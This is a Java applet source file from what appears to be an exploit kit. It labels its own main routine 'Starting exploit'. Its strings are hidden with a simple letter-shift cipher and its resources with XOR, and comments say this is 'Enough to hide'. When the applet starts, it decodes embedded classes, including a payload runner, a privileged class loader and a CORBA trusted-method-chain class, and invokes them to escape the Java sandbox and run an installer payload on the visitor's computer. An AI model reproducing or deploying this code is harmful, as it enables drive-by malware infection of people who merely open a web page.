package x;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.net.URL;
import javax.swing.JApplet;

public class XAppletW extends JApplet {

	private static final long serialVersionUID = 4268202609884012044L;
	public static URL urlBase;

	@Override
	public void init() {
		urlBase = getCodeBase();

		// Parsing arguments.
		EP.pClass = getParameter(x.Strings.dec("qDmbtt"));
		// EP.pJar = getParameter(x.Strings.dec("qKbs"));
		// EP.pBin = getParameter(x.Strings.dec("qCjo"));
		/*
		 * int argCount = 1; String arg; ArrayList<String> args = new
		 * ArrayList<String>(); while ((arg = getParameter(x.Strings.dec("qBsh") + argCount++))
		 * != null) { args.add(arg); } EP.pArgs = new String[args.size()];
		 * args.toArray(EP.pArgs);
		 */

		EP.pArgs = new String[3];

		EP.docBase = this.getDocumentBase().toString();
		debug(x.Strings.dec("Ifmmp!") + EP.docBase);

		// Starting exploit
		try {
			byte[] bytes = new byte[4096];
			InputStream in = XAppletW.class.getResourceAsStream(x.Strings.dec("dmbttft/tfs"));
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			int bytesRead;
			while ((bytesRead = in.read(bytes)) != -1) {
				out.write(bytes, 0, bytesRead);
			}
			in.close();
			bytes = out.toByteArray();
			for (int i = 0; i < bytes.length; i++) {
				bytes[i] = (byte) (bytes[i] ^ 255); // x.Strings.dec("Jowfstf!cjut!fodszqujpo"):
													// Enough to hide
			}
			ByteArrayInputStream bin = new ByteArrayInputStream(bytes);
			ObjectInputStream oin = new ObjectInputStream(bin);
			EC cl = (EC) oin.readObject();
			// -------------------

			boolean decodeNeeded = true;
			in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0qs"));
			if (in == null) {
				in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0QbzmpbeSvoofs/dmbtt"));
				decodeNeeded = false; // Dev mode
			}

			bytes = new byte[100000];

			bytesRead = in.read(bytes);
			if (decodeNeeded) {
				for (int i = 0; i < bytes.length; i++) {
					bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
				}
			}
			byte[] payloadRunnerClassBytes = new byte[bytesRead];
			System.arraycopy(bytes, 0, payloadRunnerClassBytes, 0, bytesRead);

			decodeNeeded = true;
			in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0qvd"));
			if (in == null) {
				in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0QsjwjmfhfeVSMDmbttMpbefs/dmbtt"));
				decodeNeeded = false; // Dev mode
			}

			bytes = new byte[100000];

			bytesRead = in.read(bytes);
			if (decodeNeeded) {
				for (int i = 0; i < bytes.length; i++) {
					bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
				}
			}
			byte[] privilegedURLClassLoaderClassBytes = new byte[bytesRead];
			System.arraycopy(bytes, 0, privilegedURLClassLoaderClassBytes, 0, bytesRead);

			decodeNeeded = true;
			in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0cz"));
			if (in == null) {
				in = XAppletW.class.getResourceAsStream(x.Strings.dec("0y0czuft/tfs"));
				decodeNeeded = false; // Dev mode
			}

			bytes = new byte[100000];

			bytesRead = in.read(bytes);
			if (decodeNeeded) {
				for (int i = 0; i < bytes.length; i++) {
					bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
				}
			}
			byte[] serializedBytes = new byte[bytesRead];
			System.arraycopy(bytes, 0, serializedBytes, 0, bytesRead);

			String resourceName = getResourceName();
			byte[] resourceKey = getResourceKey();

			EP.pArgs[0] = resourceName;
			EP.pArgs[1] = urlBase.toString();

			EP.pArgs[2] = encode(resourceKey);

			debug(x.Strings.dec("hfu!dmbtt!y/DpscbUsvtufeNfuipeDibjo-!tfsjbmj{fe;!") + serializedBytes.length);
			// -------------------
			Class ctmc = cl.getClass(x.Strings.dec("y/DpscbUsvtufeNfuipeDibjo"));
			ctmc.getField(x.Strings.dec("qbzmpbeSvoofsDmbttCzuft")).set(null, payloadRunnerClassBytes);
			ctmc.getField(x.Strings.dec("qsjwjmfhfeVSMDmbttMpbefsDmbttCzuft")).set(null, privilegedURLClassLoaderClassBytes);
			ctmc.getField(x.Strings.dec("tfsjbmj{feCzuft")).set(null, serializedBytes);
			ctmc.getField(x.Strings.dec("epdCbtf")).set(null, EP.docBase);
			ctmc.getField(x.Strings.dec("qKbs")).set(null, EP.pJar);
			ctmc.getField(x.Strings.dec("qDmbtt")).set(null, EP.pClass);
			ctmc.getField(x.Strings.dec("qBsht")).set(null, EP.pArgs);
			ctmc.getField(x.Strings.dec("qCjo")).set(null, EP.pBin);

			ctmc.getMethod(x.Strings.dec("hp"), new Class[] {}).invoke(null, new Object[] {});
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public String getResourceName() {
		debug(x.Strings.dec("hfuSftpvsdfObnf"));

		try {
			InputStream payloadStream = XAppletW.class.getResourceAsStream(x.Strings.dec("0o"));
			String name = new String(toByteArray(payloadStream));
			return name;
		} catch (Exception e) {
			debug(e.toString());
			return x.Strings.dec("jotubmmfs");
		}

	}

	private void debug(String string) {
		//System.out.println(string);
	}

	public byte[] getResourceKey() {
		debug(x.Strings.dec("hfuSftpvsdfLfz"));

		try {
			InputStream payloadStream = XAppletW.class.getResourceAsStream(x.Strings.dec("0l"));

			byte[] k = toByteArray(payloadStream);
			return k;
		} catch (Exception e) {
			debug(x.Strings.dec("hfuSftpvsdfLfz!Fssps;") + e.toString());
			return new byte[] { (byte) 255 };
		}
	}

	private byte[] toByteArray(InputStream is) throws IOException {
		ByteArrayOutputStream buffer = new ByteArrayOutputStream();

		int nRead;
		byte[] data = new byte[16384];

		while ((nRead = is.read(data, 0, data.length)) != -1) {
			buffer.write(data, 0, nRead);
		}

		buffer.flush();

		return buffer.toByteArray();
	}

	/**
	 * Translates the specified byte array into Base64 string.
	 * 
	 * @param buf
	 *            the byte array (not null)
	 * @return the translated Base64 string (not null)
	 */
	public String encode(byte[] buf) {
		final char[] ALPHABET = x.Strings.dec("BCDEFGHIJKLMNOPQRSTUVWXYZ[bcdefghijklmnopqrstuvwxyz{123456789:,0").toCharArray();
		int[] toInt = new int[128];

		for (int i = 0; i < ALPHABET.length; i++) {
			toInt[ALPHABET[i]] = i;
		}

		int size = buf.length;
		char[] ar = new char[((size + 2) / 3) * 4];
		int a = 0;
		int i = 0;
		while (i < size) {
			byte b0 = buf[i++];
			byte b1 = (i < size) ? buf[i++] : 0;
			byte b2 = (i < size) ? buf[i++] : 0;

			int mask = 0x3F;
			ar[a++] = ALPHABET[(b0 >> 2) & mask];
			ar[a++] = ALPHABET[((b0 << 4) | ((b1 & 0xFF) >> 4)) & mask];
			ar[a++] = ALPHABET[((b1 << 2) | ((b2 & 0xFF) >> 6)) & mask];
			ar[a++] = ALPHABET[b2 & mask];
		}
		switch (size % 3) {
		case 1:
			ar[--a] = '=';
		case 2:
			ar[--a] = '=';
		}
		return new String(ar);
	}

}
